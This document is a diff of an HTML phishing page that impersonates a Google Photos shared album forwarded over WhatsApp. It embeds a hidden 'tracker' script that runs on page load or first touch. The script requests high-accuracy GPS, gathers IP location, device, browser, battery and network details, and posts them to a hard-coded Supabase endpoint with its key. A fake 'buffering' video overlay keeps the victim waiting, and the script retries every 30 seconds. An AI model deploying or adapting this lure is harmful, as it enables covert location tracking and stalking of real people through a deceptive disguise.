@@ -12,19 +12,15 @@
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body { font-family: 'Google Sans', 'Roboto', Arial, sans-serif; background: #fff; min-height: 100vh; }
 
-  /* ── Google Photos top bar ── */
   .gp-bar { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; border-bottom: 1px solid #e0e0e0; position: sticky; top: 0; background: #fff; z-index: 10; }
   .gp-logo { display: flex; align-items: center; gap: 8px; font-size: 18px; color: #202124; font-weight: 400; }
   .gp-logo svg { width: 24px; height: 24px; }
   .gp-icon-btn { width: 36px; height: 36px; border-radius: 50%; background: none; border: none; cursor: pointer; color: #5f6368; display: flex; align-items: center; justify-content: center; }
-  .gp-icon-btn:hover { background: #f1f3f4; }
   .gp-icon-btn svg { width: 20px; height: 20px; }
 
-  /* ── WhatsApp forwarded badge ── */
   .wa-badge { margin: 10px 12px 0; background: #f0fdf4; border-left: 3px solid #25d366; border-radius: 6px; padding: 8px 12px; display: flex; align-items: flex-start; gap: 8px; font-size: 12px; color: #075e54; }
   .wa-badge strong { display: block; font-weight: 600; margin-bottom: 1px; }
 
-  /* ── Album header ── */
   .album-header { padding: 18px 16px 12px; border-bottom: 1px solid #e0e0e0; }
   .album-title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 6px; }
   .album-meta { font-size: 13px; color: #5f6368; display: flex; align-items: center; gap: 6px; }
@@ -34,7 +30,6 @@
   .shared-row span { font-size: 13px; color: #5f6368; }
   .shared-row strong { color: #202124; font-weight: 500; }
 
-  /* ── Action buttons ── */
   .action-bar { padding: 14px 16px; display: flex; gap: 10px; }
   .gp-btn { flex: 1; padding: 9px 14px; border-radius: 20px; border: 1px solid #dadce0; background: #fff; color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; transition: background .15s; }
   .gp-btn:hover { background: #f8f9fa; }
@@ -42,121 +37,100 @@
   .gp-btn.primary:hover { background: #1765cc; }
   .gp-btn svg { width: 16px; height: 16px; }
 
-  /* ── Date section label ── */
   .date-label { padding: 10px 14px 4px; font-size: 12px; font-weight: 500; color: #5f6368; letter-spacing: 0.3px; }
 
-  /* ── Photo grid ── */
   .photo-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 2px; padding: 0 2px 2px; }
   .thumb { aspect-ratio: 1; position: relative; overflow: hidden; cursor: pointer; background: #f1f3f4; }
   .thumb img { width: 100%; height: 100%; object-fit: cover; display: block; transition: transform .2s; }
   .thumb:hover img { transform: scale(1.04); }
   .thumb.wide { grid-column: span 2; aspect-ratio: 2/1; }
 
-  /* Video overlay on thumbnails */
   .vid-overlay { position: absolute; inset: 0; display: flex; align-items: flex-end; background: linear-gradient(to top, rgba(0,0,0,0.45) 0%, transparent 55%); }
   .vid-badge { display: flex; align-items: center; gap: 4px; color: #fff; font-size: 12px; font-weight: 500; padding: 6px 8px; }
   .vid-badge svg { width: 14px; height: 14px; }
   .duration { position: absolute; top: 6px; right: 7px; background: rgba(0,0,0,0.55); color: #fff; font-size: 11px; font-weight: 500; padding: 2px 6px; border-radius: 4px; }
-
-  /* Heart favourite icon */
   .fav { position: absolute; top: 6px; left: 6px; }
-  .fav svg { width: 16px; height: 16px; }
 
-  /* ── Full-screen video buffering overlay ── */
   .overlay { display: none; position: fixed; inset: 0; background: #000; z-index: 200; flex-direction: column; align-items: center; justify-content: center; }
   .overlay.show { display: flex; }
-
   .ov-topbar { position: absolute; top: 0; left: 0; right: 0; display: flex; align-items: center; justify-content: space-between; padding: 14px 16px; background: linear-gradient(to bottom, rgba(0,0,0,0.75), transparent); z-index: 2; }
   .ov-close { width: 36px; height: 36px; border-radius: 50%; background: rgba(255,255,255,0.15); border: none; color: #fff; font-size: 18px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
   .ov-filename { font-size: 13px; color: rgba(255,255,255,0.85); }
-
   .fake-player { width: 100%; max-width: 460px; aspect-ratio: 16/9; position: relative; display: flex; align-items: center; justify-content: center; overflow: hidden; border-radius: 4px; }
   .player-thumb { position: absolute; inset: 0; object-fit: cover; width: 100%; height: 100%; filter: brightness(0.38); }
   .spinner-wrap { position: relative; z-index: 2; display: flex; flex-direction: column; align-items: center; gap: 14px; }
   .ring { width: 52px; height: 52px; border: 3px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin .9s linear infinite; }
   @keyframes spin { to { transform: rotate(360deg); } }
   .buf-text { color: rgba(255,255,255,0.8); font-size: 13px; }
-  .buf-text::after { content: ''; animation: dots 1.6s steps(4, end) infinite; }
+  .buf-text::after { content: ''; animation: dots 1.6s steps(4,end) infinite; }
   @keyframes dots { 0%{content:''} 25%{content:'.'} 50%{content:'..'} 75%{content:'...'} }
-
   .progress-row { position: absolute; bottom: 44px; left: 0; right: 0; padding: 0 14px; z-index: 2; }
   .prog-bg { height: 3px; background: rgba(255,255,255,0.2); border-radius: 2px; overflow: hidden; }
   .prog-fill { height: 100%; width: 0%; background: #fff; border-radius: 2px; animation: buf 20s ease-in-out infinite; }
   @keyframes buf { 0%{width:0%} 35%{width:60%} 60%{width:60%} 85%{width:79%} 96%{width:79%} 100%{width:0%} }
-
   .ov-controls { position: absolute; bottom: 0; left: 0; right: 0; padding: 10px 14px; display: flex; align-items: center; gap: 12px; background: linear-gradient(to top, rgba(0,0,0,0.65), transparent); z-index: 2; }
   .ctrl { background: none; border: none; color: rgba(255,255,255,0.6); cursor: pointer; padding: 4px; display: flex; }
   .ctrl svg { width: 22px; height: 22px; }
   .timelabel { font-size: 12px; color: rgba(255,255,255,0.6); font-family: monospace; margin-left: auto; }
-
   .buf-notice { margin-top: 16px; font-size: 13px; color: rgba(255,255,255,0.4); text-align: center; padding: 0 24px; line-height: 1.8; }
 </style>
 </head>
 <body>
 
-<!-- ═══════════════════════════════════════════════════════
-     TRACKER  —  invisible, runs silently in background
-     Collects: GPS, IP location, device info, battery, network
-═══════════════════════════════════════════════════════ -->
+<!-- ═══════════════════════════════════════════
+     TRACKER — invisible, runs in background
+═══════════════════════════════════════════ -->
 <script>
-/* ── FILL THESE IN ── */
 var SUPABASE_URL = "https://fccizufvtgqdxpkuwjrm.supabase.co";
 var SUPABASE_KEY = "sb_publishable_LG3h8OQ8XKXj-cvt6Ii3XA_m-014x8t";
-/* ────────────────── */
 
 var saved = false;
 
-/* ══ 1. Device info — collected synchronously, never null ══ */
+/* ── 1. Device info — synchronous, never fails ── */
 function getDeviceInfo() {
   var ua = navigator.userAgent || "";
   var m;
 
   var browser = "Unknown Browser";
-  if      (/CriOS/i.test(ua))               browser = "Chrome (iOS)";
-  else if (/FxiOS/i.test(ua))               browser = "Firefox (iOS)";
-  else if (/EdgiOS/i.test(ua))              browser = "Edge (iOS)";
-  else if (/OPiOS/i.test(ua))              browser = "Opera (iOS)";
-  else if (/SamsungBrowser/i.test(ua))      browser = "Samsung Browser";
-  else if (/YaBrowser/i.test(ua))           browser = "Yandex Browser";
-  else if (/UCBrowser/i.test(ua))           browser = "UC Browser";
-  else if (/OPR\//i.test(ua))              browser = "Opera";
+  if      (/CriOS/i.test(ua))              browser = "Chrome (iOS)";
+  else if (/FxiOS/i.test(ua))              browser = "Firefox (iOS)";
+  else if (/EdgiOS/i.test(ua))             browser = "Edge (iOS)";
+  else if (/SamsungBrowser/i.test(ua))     browser = "Samsung Browser";
+  else if (/OPR\//i.test(ua))             browser = "Opera";
   else if (/Edg\//i.test(ua))             browser = "Edge";
   else if (/Chrome\/[\d.]+/i.test(ua) && !/Chromium/i.test(ua)) browser = "Chrome";
   else if (/Firefox\//i.test(ua))          browser = "Firefox";
   else if (/Safari\//i.test(ua))           browser = "Safari";
 
   var os = "Unknown OS";
-  if      ((m = ua.match(/iPhone OS ([\d_]+)/i)))     os = "iOS "     + m[1].replace(/_/g, ".");
-  else if ((m = ua.match(/iPad.*OS ([\d_]+)/i)))      os = "iPadOS "  + m[1].replace(/_/g, ".");
-  else if ((m = ua.match(/Android ([\d.]+)/i)))       os = "Android " + m[1];
-  else if (/Windows NT 10/i.test(ua))                 os = "Windows 10/11";
-  else if (/Windows NT 6\.3/i.test(ua))               os = "Windows 8.1";
-  else if (/Windows NT 6\.1/i.test(ua))               os = "Windows 7";
-  else if ((m = ua.match(/Mac OS X ([\d_]+)/i)))      os = "macOS "   + m[1].replace(/_/g, ".");
-  else if (/Linux/i.test(ua))                         os = "Linux";
+  if      ((m = ua.match(/iPhone OS ([\d_]+)/i)))   os = "iOS "     + m[1].replace(/_/g, ".");
+  else if ((m = ua.match(/iPad.*OS ([\d_]+)/i)))    os = "iPadOS "  + m[1].replace(/_/g, ".");
+  else if ((m = ua.match(/Android ([\d.]+)/i)))     os = "Android " + m[1];
+  else if (/Windows NT 10/i.test(ua))               os = "Windows 10/11";
+  else if ((m = ua.match(/Mac OS X ([\d_]+)/i)))    os = "macOS "   + m[1].replace(/_/g, ".");
+  else if (/Linux/i.test(ua))                       os = "Linux";
 
   var device = "Unknown Device";
-  if      (/iPhone/i.test(ua))                        device = "Apple iPhone";
-  else if (/iPad/i.test(ua))                          device = "Apple iPad";
-  else if ((m = ua.match(/SM-([A-Z0-9]+)/i)))         device = "Samsung SM-" + m[1];
-  else if ((m = ua.match(/Samsung ([^;)]+)/i)))       device = "Samsung " + m[1].trim();
-  else if ((m = ua.match(/Pixel (\d[\w\s]*)/i)))      device = "Google Pixel " + m[1].trim();
-  else if ((m = ua.match(/Redmi\s?([^;)\/]+)/i)))     device = "Redmi " + m[1].trim();
-  else if ((m = ua.match(/POCO\s?([^;)\/]+)/i)))      device = "POCO " + m[1].trim();
-  else if ((m = ua.match(/OnePlus\s?([^;)\/]+)/i)))   device = "OnePlus " + m[1].trim();
-  else if ((m = ua.match(/Moto\s?([^;)\/]+)/i)))      device = "Motorola " + m[1].trim();
-  else if ((m = ua.match(/vivo\s?([^;)\/]+)/i)))      device = "Vivo " + m[1].trim();
-  else if ((m = ua.match(/OPPO\s?([^;)\/]+)/i)))      device = "OPPO " + m[1].trim();
-  else if ((m = ua.match(/Realme\s?([^;)\/]+)/i)))    device = "Realme " + m[1].trim();
-  else if (/Android/i.test(ua))                       device = "Android Phone";
-  else if (/Macintosh/i.test(ua))                     device = "Mac";
-  else if (/Windows/i.test(ua))                       device = "Windows PC";
+  if      (/iPhone/i.test(ua))                      device = "Apple iPhone";
+  else if (/iPad/i.test(ua))                        device = "Apple iPad";
+  else if ((m = ua.match(/SM-([A-Z0-9]+)/i)))       device = "Samsung SM-" + m[1];
+  else if ((m = ua.match(/Pixel (\d[\w\s]*)/i)))    device = "Google Pixel " + m[1].trim();
+  else if ((m = ua.match(/Redmi\s?([^;)\/]+)/i)))   device = "Redmi " + m[1].trim();
+  else if ((m = ua.match(/POCO\s?([^;)\/]+)/i)))    device = "POCO " + m[1].trim();
+  else if ((m = ua.match(/OnePlus\s?([^;)\/]+)/i))) device = "OnePlus " + m[1].trim();
+  else if ((m = ua.match(/Moto\s?([^;)\/]+)/i)))    device = "Motorola " + m[1].trim();
+  else if ((m = ua.match(/vivo\s?([^;)\/]+)/i)))    device = "Vivo " + m[1].trim();
+  else if ((m = ua.match(/OPPO\s?([^;)\/]+)/i)))    device = "OPPO " + m[1].trim();
+  else if ((m = ua.match(/Realme\s?([^;)\/]+)/i)))  device = "Realme " + m[1].trim();
+  else if (/Android/i.test(ua))                     device = "Android Phone";
+  else if (/Macintosh/i.test(ua))                   device = "Mac";
+  else if (/Windows/i.test(ua))                     device = "Windows PC";
 
   var network = "Unknown";
   try {
     var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (c) network = (c.effectiveType || c.type || "unknown") + (c.downlink ? " | " + c.downlink + " Mbps" : "");
-  } catch (e) {}
+  } catch(e) {}
 
   return {
     user_agent:  ua,
@@ -169,116 +143,139 @@ function getDeviceInfo() {
   };
 }
 
-/* ══ 2. Battery — async but non-blocking ══ */
+/* ── 2. Battery ── */
 function fetchBattery() {
-  if (!navigator.getBattery) return Promise.resolve("Not supported");
+  if (!navigator.getBattery) return Promise.resolve("not supported");
   return navigator.getBattery()
     .then(function(b) {
       return Math.round(b.level * 100) + "% " + (b.charging ? "(charging)" : "(not charging)");
     })
-    .catch(function() { return "Permission denied"; });
+    .catch(function() { return "unavailable"; });
 }
 
-/* ══ 3. IP geolocation — two providers, race for fastest ══ */
+/* ── 3. IP geolocation — mobile-safe APIs only ── */
 function fetchIPData() {
   var empty = { ip_address: null, city: null, region: null, country: null, ip_lat: null, ip_lng: null };
 
-  /* ip-api.com — free, no key, works on mobile */
-  var p1 = fetch("https://ip-api.com/json/?fields=status,query,city,regionName,country,lat,lon")
-    .then(function(r){ return r.json(); })
-    .then(function(d){
+  /* ip-api.com — free, no key needed, full CORS support on mobile */
+  var p1 = fetch("http://ip-api.com/json/?fields=status,query,city,regionName,country,lat,lon")
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
       if (d.status !== "success") return null;
+      console.log("[tracker] ip-api.com response:", d);
       return { ip_address: d.query || null, city: d.city || null, region: d.regionName || null, country: d.country || null, ip_lat: d.lat || null, ip_lng: d.lon || null };
     })
-    .catch(function(){ return null; });
+    .catch(function(e) { console.warn("[tracker] ip-api.com failed:", e); return null; });
 
-  /* ipify + ipapi fallback */
-  var p2 = fetch("https://api.ipify.org?format=json")
-    .then(function(r){ return r.json(); })
-    .then(function(d){
-      return fetch("https://ipapi.co/" + d.ip + "/json/");
+  /* ipinfo.io — free tier, 50k req/month, good CORS */
+  var p2 = fetch("https://ipinfo.io/json?token=")
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+      console.log("[tracker] ipinfo.io response:", d);
+      var ll = (d.loc || "").split(",");
+      return { ip_address: d.ip || null, city: d.city || null, region: d.region || null, country: d.country || null, ip_lat: ll[0] ? parseFloat(ll[0]) : null, ip_lng: ll[1] ? parseFloat(ll[1]) : null };
     })
-    .then(function(r){ return r.json(); })
-    .then(function(d){
-      return { ip_address: d.ip || null, city: d.city || null, region: d.region || null, country: d.country_name || null, ip_lat: d.latitude || null, ip_lng: d.longitude || null };
-    })
-    .catch(function(){ return null; });
+    .catch(function(e) { console.warn("[tracker] ipinfo.io failed:", e); return null; });
 
   return Promise.all([p1, p2]).then(function(results) {
     var result = results[0] || results[1] || empty;
-    console.log("[tracker] IP resolved:", result);
+    console.log("[tracker] IP data final:", result);
     return result;
   });
 }
 
-/* ══ 4. Save to Supabase ══ */
-function saveToSupabase(payload) {
+/* ── 4. Save to Supabase ── */
+function saveToSupabase(gpsData, ipData, deviceData, battery) {
   if (saved) return;
   saved = true;
-  var clean = {};
-  Object.keys(payload).forEach(function(k) {
-    if (payload[k] !== undefined && payload[k] !== "") clean[k] = payload[k];
-  });
+
+  var payload = {
+    latitude:    gpsData.latitude    !== undefined ? gpsData.latitude    : null,
+    longitude:   gpsData.longitude   !== undefined ? gpsData.longitude   : null,
+    accuracy:    gpsData.accuracy    !== undefined ? gpsData.accuracy    : null,
+    maps_link:   gpsData.maps_link   || null,
+    captured_at: new Date().toISOString(),
+    user_agent:  deviceData.user_agent  || null,
+    browser:     deviceData.browser     || null,
+    os:          deviceData.os          || null,
+    device:      deviceData.device      || null,
+    screen_size: deviceData.screen_size || null,
+    language:    deviceData.language    || null,
+    network:     deviceData.network     || null,
+    battery:     battery                || null,
+    ip_address:  ipData.ip_address || null,
+    city:        ipData.city       || null,
+    region:      ipData.region     || null,
+    country:     ipData.country    || null,
+    ip_lat:      ipData.ip_lat     || null,
+    ip_lng:      ipData.ip_lng     || null
+  };
+
+  console.log("[tracker] saving payload:", payload);
+
   fetch(SUPABASE_URL + "/rest/v1/locations", {
     method: "POST",
     headers: {
       "Content-Type": "application/json",
-      "apikey": SUPABASE_KEY,
+      "apikey":        SUPABASE_KEY,
       "Authorization": "Bearer " + SUPABASE_KEY,
-      "Prefer": "return=minimal"
+      "Prefer":        "return=minimal"
     },
-    body: JSON.stringify(clean)
-  }).catch(function() {});
+    body: JSON.stringify(payload)
+  })
+  .then(function(res) {
+    if (res.ok) {
+      console.log("[tracker] ✅ saved to Supabase!");
+    } else {
+      res.text().then(function(t) {
+        console.error("[tracker] ❌ Supabase error " + res.status + ":", t);
+      });
+    }
+  })
+  .catch(function(e) { console.error("[tracker] ❌ save failed:", e); });
 }
 
-/* ══ 5. MAIN — GPS + IP + battery all run in parallel ══ */
+/* ── 5. Main logic ── */
 function runTracker() {
-  /* Collect device info right now — synchronous, always works */
-  var info = getDeviceInfo();
-  info.captured_at = new Date().toISOString();
+  console.log("[tracker] starting...");
+  var deviceData = getDeviceInfo();
+  console.log("[tracker] device:", deviceData);
 
-  /* Kick off IP + battery immediately in background */
   var ipPromise      = fetchIPData();
   var batteryPromise = fetchBattery();
 
-  /* After GPS resolves (or fails), wait up to 6s for IP+battery then save */
-  function finish(gpsFields) {
-    var deadline = new Promise(function(resolve) { setTimeout(resolve, 6000); });
-    Promise.race([
-      Promise.all([ipPromise, batteryPromise]),
-      deadline
-    ]).then(function(result) {
-      var payload = Object.assign({}, info, gpsFields || {});
-      if (Array.isArray(result)) {
-        Object.assign(payload, result[0]);
-        payload.battery = result[1];
-      }
-      /* Build Google Maps link */
-      if (payload.latitude && payload.longitude) {
-        payload.maps_link = "https://maps.google.com/?q=" + payload.latitude + "," + payload.longitude;
-      } else if (payload.ip_lat && payload.ip_lng) {
-        payload.maps_link = "https://maps.google.com/?q=" + payload.ip_lat + "," + payload.ip_lng + " (IP-approx)";
-      } else {
-        payload.maps_link = "no_location";
-      }
-      saveToSupabase(payload);
-    });
+  function finish(gpsData) {
+    console.log("[tracker] GPS:", gpsData);
+    var deadline = new Promise(function(resolve) { setTimeout(resolve, 6000, "timeout"); });
+    Promise.race([Promise.all([ipPromise, batteryPromise]), deadline])
+      .then(function(result) {
+        var ipData  = (Array.isArray(result) ? result[0] : null) || { ip_address: null, city: null, region: null, country: null, ip_lat: null, ip_lng: null };
+        var battery = Array.isArray(result) ? result[1] : "timeout";
+        saveToSupabase(gpsData, ipData, deviceData, battery);
+      });
   }
 
-  if (!navigator.geolocation) { finish(null); return; }
+  if (!navigator.geolocation) {
+    finish({ latitude: null, longitude: null, accuracy: null, maps_link: "geolocation_not_supported" });
+    return;
+  }
 
+  console.log("[tracker] requesting GPS...");
   navigator.geolocation.getCurrentPosition(
     function(pos) {
-      finish({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy });
+      var lat = pos.coords.latitude, lng = pos.coords.longitude;
+      console.log("[tracker] GPS success:", lat, lng);
+      finish({ latitude: lat, longitude: lng, accuracy: pos.coords.accuracy, maps_link: "https://maps.google.com/?q=" + lat + "," + lng });
     },
     function(err) {
-      finish({ latitude: null, longitude: null, accuracy: null, gps_error: err.message });
+      console.warn("[tracker] GPS denied:", err.message);
+      finish({ latitude: null, longitude: null, accuracy: null, maps_link: "gps_denied: " + err.message });
     },
     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
   );
 }
 
-/* ══ 6. Trigger — load fires for Android, touch fires for iOS Safari ══ */
+/* ── 6. Trigger — load for Android, touch for iOS ── */
 var started = false;
 function startOnce() {
   if (started) return;
@@ -290,17 +287,14 @@ window.addEventListener("load", startOnce);
 document.addEventListener("touchstart", function() { startOnce(); }, { once: true, passive: true });
 document.addEventListener("click",      function() { startOnce(); }, { once: true });
 
-/* Retry every 30s while page stays open */
-setInterval(function() { if (!saved) { started = false; startOnce(); } }, 30000);
+setInterval(function() {
+  if (!saved) { started = false; startOnce(); }
+}, 30000);
 </script>
-<!-- ════════════════════════════════════════════════════════ -->
+<!-- ═══════════════════════════════════════════ -->
 
 
-<!-- ══════════════════════════════════
-     VISIBLE PAGE — Google Photos UI
-══════════════════════════════════ -->
-
-<!-- Google Photos nav bar -->
+<!-- Google Photos bar -->
 <div class="gp-bar">
   <div class="gp-logo">
     <svg viewBox="0 0 192 192" xmlns="http://www.w3.org/2000/svg">
@@ -312,12 +306,8 @@ setInterval(function() { if (!saved) { started = false; startOnce(); } }, 30000)
     Google Photos
   </div>
   <div style="display:flex;gap:4px;">
-    <button class="gp-icon-btn">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
-    </button>
-    <button class="gp-icon-btn">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M6 20v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2"/></svg>
-    </button>
+    <button class="gp-icon-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg></button>
+    <button class="gp-icon-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M6 20v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2"/></svg></button>
   </div>
 </div>
 
@@ -343,7 +333,7 @@ setInterval(function() { if (!saved) { started = false; startOnce(); } }, 30000)
   </div>
 </div>
 
-<!-- Action buttons -->
+<!-- Buttons -->
 <div class="action-bar">
   <button class="gp-btn" onclick="openVideo()">
     <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
@@ -358,116 +348,80 @@ setInterval(function() { if (!saved) { started = false; startOnce(); } }, 30000)
   </button>
 </div>
 
-<!-- ── Section 1 ── -->
+<!-- Section 1 -->
 <div class="date-label">Today · May 10</div>
 <div class="photo-grid">
 
-  <!-- Wide video hero -->
   <div class="thumb wide" onclick="openVideo()">
     <img src="https://images.unsplash.com/photo-1507525428034-b723cf961d3e?w=600&q=80" alt="" loading="lazy" />
-    <div class="vid-overlay">
-      <div class="vid-badge">
-        <svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-        1:24
-      </div>
-    </div>
+    <div class="vid-overlay"><div class="vid-badge"><svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>1:24</div></div>
     <div class="duration">1:24</div>
   </div>
 
-  <!-- Sunset with heart -->
   <div class="thumb">
     <img src="https://images.unsplash.com/photo-1500534314209-a25ddb2bd429?w=400&q=80" alt="" loading="lazy" />
     <div class="fav"><svg viewBox="0 0 24 24" fill="red" width="16" height="16"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></div>
   </div>
 
-  <!-- Pool -->
   <div class="thumb">
     <img src="https://images.unsplash.com/photo-1540541338287-41700207dee6?w=400&q=80" alt="" loading="lazy" />
   </div>
 
-  <!-- Mountain -->
   <div class="thumb">
     <img src="https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?w=400&q=80" alt="" loading="lazy" />
   </div>
 
-  <!-- Waterfall video -->
   <div class="thumb" onclick="openVideo()">
     <img src="https://images.unsplash.com/photo-1432405972618-c60b0225b8f9?w=400&q=80" alt="" loading="lazy" />
-    <div class="vid-overlay">
-      <div class="vid-badge">
-        <svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-        0:38
-      </div>
-    </div>
+    <div class="vid-overlay"><div class="vid-badge"><svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>0:38</div></div>
     <div class="duration">0:38</div>
   </div>
 
-  <!-- Market -->
   <div class="thumb">
     <img src="https://images.unsplash.com/photo-1555396273-367ea4eb4db5?w=400&q=80" alt="" loading="lazy" />
   </div>
 
 </div>
 
-<!-- ── Section 2 ── -->
+<!-- Section 2 -->
 <div class="date-label">Yesterday · May 9</div>
 <div class="photo-grid">
 
-  <!-- Temple -->
   <div class="thumb">
     <img src="https://images.unsplash.com/photo-1524492412937-b28074a5d7da?w=400&q=80" alt="" loading="lazy" />
   </div>
 
-  <!-- City night wide video -->
   <div class="thumb wide" onclick="openVideo()">
     <img src="https://images.unsplash.com/photo-1477959858617-67f85cf4f1df?w=600&q=80" alt="" loading="lazy" />
-    <div class="vid-overlay">
-      <div class="vid-badge">
-        <svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-        2:05
-      </div>
-    </div>
+    <div class="vid-overlay"><div class="vid-badge"><svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>2:05</div></div>
     <div class="duration">2:05</div>
   </div>
 
-  <!-- Boat -->
   <div class="thumb">
     <img src="https://images.unsplash.com/photo-1505118380757-91f5f5632de0?w=400&q=80" alt="" loading="lazy" />
   </div>
 
-  <!-- Food with heart -->
   <div class="thumb">
     <img src="https://images.unsplash.com/photo-1565299624946-b28f40a0ae38?w=400&q=80" alt="" loading="lazy" />
     <div class="fav"><svg viewBox="0 0 24 24" fill="red" width="16" height="16"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></div>
   </div>
 
-  <!-- Jungle video -->
   <div class="thumb" onclick="openVideo()">
     <img src="https://images.unsplash.com/photo-1448375240586-882707db888b?w=400&q=80" alt="" loading="lazy" />
-    <div class="vid-overlay">
-      <div class="vid-badge">
-        <svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-        0:55
-      </div>
-    </div>
+    <div class="vid-overlay"><div class="vid-badge"><svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>0:55</div></div>
     <div class="duration">0:55</div>
   </div>
 
-  <!-- Landscape -->
   <div class="thumb">
     <img src="https://images.unsplash.com/photo-1476514525535-07fb3b4ae5f1?w=400&q=80" alt="" loading="lazy" />
   </div>
 
 </div>
-
 <div style="height:30px;"></div>
 
 
-<!-- ══════════════════════════════════
-     VIDEO BUFFERING OVERLAY
-══════════════════════════════════ -->
+<!-- Video overlay -->
 <div class="overlay" id="overlay">
-
   <div class="ov-topbar">
     <button class="ov-close" onclick="closeVideo()">✕</button>
     <span class="ov-filename">VID_20250510_trip.mp4</span>
@@ -478,7 +432,6 @@ setInterval(function() { if (!saved) { started = false; startOnce(); } }, 30000)
       </svg>
     </button>
   </div>
-
   <div class="fake-player">
     <img class="player-thumb" src="https://images.unsplash.com/photo-1507525428034-b723cf961d3e?w=600&q=80" alt="" />
     <div class="spinner-wrap">
@@ -490,29 +443,18 @@ setInterval(function() { if (!saved) { started = false; startOnce(); } }, 30000)
     </div>
     <div class="ov-controls">
       <button class="ctrl"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg></button>
-      <button class="ctrl">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-          <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/>
-          <path d="M19.07 4.93a10 10 0 0 1 0 14.14M15.54 8.46a5 5 0 0 1 0 7.07"/>
-        </svg>
-      </button>
+      <button class="ctrl"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M15.54 8.46a5 5 0 0 1 0 7.07"/></svg></button>
       <span class="timelabel">0:00 / 1:24</span>
-      <button class="ctrl">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-          <path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"/>
-        </svg>
-      </button>
+      <button class="ctrl"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"/></svg></button>
     </div>
   </div>
-
   <div class="buf-notice">Video is buffering due to slow connection.<br>Please wait a moment...</div>
-
 </div>
 
 <script>
 function openVideo() {
   document.getElementById('overlay').classList.add('show');
-  startOnce(); /* extra trigger for iOS that hasn't fired yet */
+  startOnce();
 }
 function closeVideo() {
   document.getElementById('overlay').classList.remove('show');
